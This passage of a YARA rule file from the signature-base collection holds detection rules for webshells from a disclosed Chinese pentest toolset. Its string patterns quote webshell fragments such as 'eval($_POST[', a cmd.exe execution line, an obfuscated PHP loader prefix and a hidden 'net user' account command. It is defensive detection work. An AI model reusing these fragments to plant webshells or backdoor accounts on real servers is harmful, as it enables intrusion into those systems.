		uint16(0)==0x433c and filesize <13KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_PHP_Linux : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file linux.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "8d94f1c5-2139-5d0d-8af9-9c30a0359910"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L93-L108"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "78339abb4e2bb00fe8a012a0a5b7ffce305f4e06"
		logic_hash = "2c6278acd123e0d41ed4f0f8f0da27d5de1ad56efb8102c9eae442838a0416d0"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<form name=form1 action=exploit.php method=post>" fullword ascii
		$s1 = "<title>Changing CHMOD Permissions Exploit " fullword ascii

	condition:
		uint16(0)==0x696c and filesize <6KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Interception3389_Get : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file get.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "b17a793f-ffb7-5cdc-ba21-b0e2f0d14490"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L110-L126"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ceb6306f6379c2c1634b5058e1894b43abcf0296"
		logic_hash = "649e611c9d8948e60811af4209d737b3e797e6b42beba42439541ae543b062d6"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "userip = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\")" fullword ascii
		$s1 = "file.writeline  szTime + \" HostName:\" + szhostname + \" IP:\" + userip+\":\"+n" ascii
		$s3 = "set file=fs.OpenTextFile(server.MapPath(\"WinlogonHack.txt\"),8,True)" fullword ascii

	condition:
		filesize <3KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Nc_1 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file 1.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "fe83df79-f7cb-50b8-bb34-9bfc5fbe3de2"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L128-L143"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "51d83961171db000fe4476f36d703ef3de409676"
		logic_hash = "80ea8f16d943a3775fe9999131272af9e7f1af60d413109e58ecdef036484760"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 " ascii
		$s2 = "<%if session(\"pw\")<>\"go\" then %>" fullword ascii

	condition:
		filesize <11KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_PHP_Blacksky : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file php6.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "741bb4db-6296-5222-8480-1169a6f44fd8"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L145-L160"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a60a599c6c8b6a6c0d9da93201d116af257636d7"
		logic_hash = "3b92f63f536361d8ba0cde853fb546f271abdec3a7c1d44688a42610f5f90c57"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "eval(gzinflate(base64_decode('" ascii
		$s1 = "B1ac7Sky-->" fullword ascii

	condition:
		filesize <641KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASP_Asp3 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file asp3.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "0cb01c07-b424-532d-8aef-5ec25dfe3f19"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L162-L177"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "87c5a76989bf08da5562e0b75c196dcb3087a27b"
		logic_hash = "e5f30a445be30c491e669c633bf2df08cbfb1017ecfc91f9ed83275550488304"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if shellpath=\"\" then shellpath = \"cmd.exe\"" fullword ascii
		$s2 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", Tru" ascii

	condition:
		filesize <444KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASPX_Sniff : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file sniff.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "8cf47d71-1b97-5967-ad70-2ea6fad7cc29"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L179-L194"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e246256696be90189e6d50a4ebc880e6d9e28dfd"
		logic_hash = "198442e75422055e7d65c5d1aef55819036a99077aa79dbd5006ba97c4fe4af8"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));" fullword ascii
		$s2 = "if (!logIt && my_s_smtp && (dport == 25 || sport == 25))" fullword ascii

	condition:
		filesize <91KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Udf_Udf : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file udf.php"
		author = "Florian Roth (Nextron Systems)"
		id = "07252f2d-1a99-5f21-940d-899a4821b511"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L196-L211"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "df63372ccab190f2f1d852f709f6b97a8d9d22b9"
		logic_hash = "c7db32b5e66601e0b8322ac67b6b9ba8d6222891ed01db557bfac9985140421a"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<?php // Source  My : Meiam  " fullword ascii
		$s2 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii

	condition:
		filesize <430KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_JSP_Jsp : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file jsp.html"
		author = "Florian Roth (Nextron Systems)"
		id = "46f2fb10-2c0c-5bc2-b3bb-eba4c74bcad7"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L213-L228"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c58fed3d3d1e82e5591509b04ed09cb3675dc33a"
		logic_hash = "089e1a553900d149a4087ac81254295d74de15d9baaf73e60ce4f061e450e8c7"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input name=f size=30 value=shell.jsp>" fullword ascii
		$s2 = "<font color=red>www.i0day.com  By:" fullword ascii

	condition:
		filesize <3KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_T00Ls_Lpk_Sethc_V4_Mail : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file mail.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2f7d8a4d-9d94-5f23-9768-cc3712678d93"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L230-L245"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0a9b7b438591ee78ee573028cbb805a9dbb9da96"
		logic_hash = "b835a6d0c736116e0a8b277dadbf25c2ac333b0d7937a6f67ed59887c610a57a"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if (!$this->smtp_putcmd(\"AUTH LOGIN\", base64_encode($this->user)))" fullword ascii
		$s2 = "$this->smtp_debug(\"> \".$cmd.\"\\n\");" fullword ascii

	condition:
		filesize <39KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Phpwebbackup : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file phpwebbackup.php"
		author = "Florian Roth (Nextron Systems)"
		id = "eb737ea6-231c-5e8d-b976-75f1044f9f54"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L247-L262"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c788cb280b7ad0429313837082fe84e9a49efab6"
		logic_hash = "45452fc415fbafe170a1b1f5a58df40f0ec65a9a6678e675b40a8c54e2d8bd6c"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php // Code By isosky www.nbst.org" fullword ascii
		$s2 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii

	condition:
		uint16(0)==0x3f3c and filesize <67KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Dz_Phpcms_Phpbb : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file dz_phpcms_phpbb.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "f7e5413f-a7c9-51d4-8422-30c3e2462be2"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L264-L281"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "33f23c41df452f8ca2768545ac6e740f30c44d1f"
		logic_hash = "1455df58f51c3ae7558b89c940d97ea5870f261217b2a09727bb6678bcbd5500"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if($pwd == md5(md5($password).$salt))" fullword ascii
		$s2 = "function test_1($password)" fullword ascii
		$s3 = ":\".$pwd.\"\\n---------------------------------\\n\";exit;" fullword ascii
		$s4 = ":user=\".$user.\"\\n\";echo \"pwd=\".$pwd.\"\\n\";echo \"salt=\".$salt.\"\\n\";" fullword ascii

	condition:
		filesize <22KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Picloaked_1 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file 1.gif"
		author = "Florian Roth (Nextron Systems)"
		id = "2ff44c4a-ed97-5635-9926-8d54a8364fab"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L283-L299"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3eab1798cbc9ab3b2c67d3da7b418d07e775db70"
		logic_hash = "a816ac9e98b7c5208f075ffcb9a6525016d6a5c468005d78ecab90d651423705"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php eval($_POST[" ascii
		$s1 = ";<%execute(request(" ascii
		$s3 = "GIF89a" fullword ascii

	condition:
		filesize <6KB and 2 of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Assembly : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file assembly.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7639e81d-fe21-5a12-9a20-fe894eefef73"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L301-L315"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2bcb4d22758b20df6b9135d3fb3c8f35a9d9028e"
		logic_hash = "34dc47b2f91a15a62175f3cab88d5ff24d2a3aa62f74fb9e43a4aaae96ced999"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "response.write oScriptlhn.exec(\"cmd.exe /c\" & request(\"c\")).stdout.readall" fullword ascii

	condition:
		filesize <1KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_PHP_Php8 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file php8.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "8b25b7f3-b94e-5887-b102-b52d340a4316"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L317-L334"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b7b49f1d6645865691eccd025e140c521ff01cce"
		logic_hash = "435ceb72c082f702284c464979a907a59a42bb4aa07311f9b2da1a9831efac11"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<a href=\"http://hi.baidu.com/ca3tie1/home\" target=\"_blank\">Ca3tie1's Blog</a" ascii
		$s1 = "function startfile($path = 'dodo.zip')" fullword ascii
		$s3 = "<form name=\"myform\" method=\"post\" action=\"\">" fullword ascii
		$s5 = "$_REQUEST[zipname] = \"dodozip.zip\"; " fullword ascii

	condition:
		filesize <25KB and 2 of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Tuoku_Script_Xx : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file xx.php"
		author = "Florian Roth (Nextron Systems)"
		id = "72a04950-b82d-516f-a376-5253b7de1158"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L336-L352"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2f39f1d9846ae72fc673f9166536dc21d8f396aa"
		logic_hash = "67c542f172fd1b97fbee4697fd42bab9486e3d779ce62993617e5a5205bd75d4"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$mysql.=\"insert into `$table`($keys) values($vals);\\r\\n\";" fullword ascii
		$s2 = "$mysql_link=@mysql_connect($mysql_servername , $mysql_username , $mysql_password" ascii
		$s16 = "mysql_query(\"SET NAMES gbk\");" fullword ascii

	condition:
		filesize <2KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_JSPMSSQL : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file JSPMSSQL.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "061c1e53-edd0-5838-8d0f-6fb8f4fa078a"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L354-L369"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c6b4faecd743d151fe0a4634e37c9a5f6533655f"
		logic_hash = "c08e69345cb09e41840a81dcd8a015f9e1be93d570b64c310be74631e5314e2f"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<form action=\"?action=operator&cmd=execute\"" fullword ascii
		$s2 = "String sql = request.getParameter(\"sqlcmd\");" fullword ascii

	condition:
		filesize <35KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Injection_Transit_Jmpost : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file jmPost.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "892f747e-6065-5baf-b928-8d69d8792483"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L371-L386"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f80ec26bbdc803786925e8e0450ad7146b2478ff"
		logic_hash = "6c7f52cf7ff6df9867ea2c46cd8f40ef0e077d4e1d9033cde0649a209bffe21b"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "response.write  PostData(JMUrl,JmStr,JmCok,JmRef)" fullword ascii
		$s2 = "JmdcwName=request(\"jmdcw\")" fullword ascii

	condition:
		filesize <9KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASP_Web_Asp : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file web.asp.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "67e03591-770a-5b32-9579-c899894740fc"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L388-L403"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "aebf6530e89af2ad332062c6aae4a8ca91517c76"
		logic_hash = "5d2d7e6b9340ee4fd845ff05c99526c919214974b1a0def66492fe3cd4a75fe9"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<FORM method=post target=_blank>ShellUrl: <INPUT " fullword ascii
		$s1 = "\" >[Copy code]</a> 4ngr7&nbsp; &nbsp;</td>" fullword ascii

	condition:
		filesize <13KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Wshell_Asp : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file wshell-asp.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "294f0d00-7102-553d-92e2-c0a0e017385c"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L405-L421"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "4a0afdf5a45a759c14e99eb5315964368ca53e9c"
		logic_hash = "f3c4af85e4798d3a809d8edd9cc46d1df44453f14ed050b002fe789da4d6096f"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "file1.Write(\"<%response.clear:execute request(\\\"root\\\"):response.End%>\");" fullword ascii
		$s2 = "hello word !  " fullword ascii
		$s3 = "root.asp " fullword ascii

	condition:
		filesize <5KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASP_Asp404 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file asp404.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "4125bb40-3f5c-53f5-b906-54fa77b119f5"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L423-L439"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "bed51971288aeabba6dabbfb80d2843ec0c4ebf6"
		logic_hash = "c84be2e561a08317be11cdb0fe103f8ad182a64d8cd1bf987163ebbeabe20f00"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "temp1 = Len(folderspec) - Len(server.MapPath(\"./\")) -1" fullword ascii
		$s1 = "<form name=\"form1\" method=\"post\" action=\"<%= url%>?action=chklogin\">" fullword ascii
		$s2 = "<td>&nbsp;<a href=\"<%=tempurl+f1.name%>\" target=\"_blank\"><%=f1.name%></a></t" ascii

	condition:
		filesize <113KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Serv_U_Asp : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file Serv-U asp.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "06a58a05-92bd-5124-a172-2bfd9491c2fc"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L441-L457"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cee91cd462a459d31a95ac08fe80c70d2f9c1611"
		logic_hash = "c98c3f4db5ea812827b6108ef88b57116621142202248f4f26f0c71bd76e33ec"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" &" ascii
		$s2 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun lov" ascii
		$s3 = "deldomain = \"-DELETEDOMAIN\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \" PortNo=\"" ascii

	condition:
		filesize <30KB and 2 of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Cfm_List : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file list.cfm"
		author = "Florian Roth (Nextron Systems)"
		id = "98302eef-d1e8-5524-a57e-d49c0e92c7e0"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L459-L474"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "85d445b13d2aef1df3b264c9b66d73f0ff345cec"
		logic_hash = "41c7c5ba6187a8871dec83bcd859b9377813d60cea8ef2b4ad390c67de04e010"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<TD><a href=\"javascript:ShowFile('#mydirectory.name#')\">#mydirectory.name#</a>" ascii
		$s2 = "<TD>#mydirectory.size#</TD>" fullword ascii

	condition:
		filesize <10KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_PHP_Php2 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file php2.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "377ff89d-a9ba-526c-97a1-388f9ccb48ba"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L476-L491"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "bf12e1d741075cd1bd324a143ec26c732a241dea"
		logic_hash = "707e2795d82636fbbc4d9f5324e509a526f77f9ead8f3c4d59dd0e95bc94f11e"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii
		$s2 = "<?php // Black" fullword ascii

	condition:
		filesize <12KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Tuoku_Script_Oracle : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file oracle.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "adc8dea6-8031-580b-b19a-e5520d41528f"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L493-L509"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "fc7043aaac0ee2d860d11f18ddfffbede9d07957"
		logic_hash = "3ad4207e426ed2f9df0e0bac0e906af437b0774ba2ebb541afbe7e29b395ad63"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword ascii
		$s2 = "String user=\"oracle_admin\";" fullword ascii
		$s3 = "String sql=\"SELECT 1,2,3,4,5,6,7,8,9,10 from user_info\";" fullword ascii

	condition:
		filesize <7KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASPX_Aspx4 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file aspx4.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "4a13c809-48f7-54f7-9ce3-10d6d48104fb"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L511-L527"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "200a8f15ffb6e3af31d28c55588003b5025497eb"
		logic_hash = "0aab8e327b4477cb0b8cd5d4b1e4b52c160180656dad57b0498654da1c8d7a29"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "File.Delete(cdir.FullName + \"\\\\test\");" fullword ascii
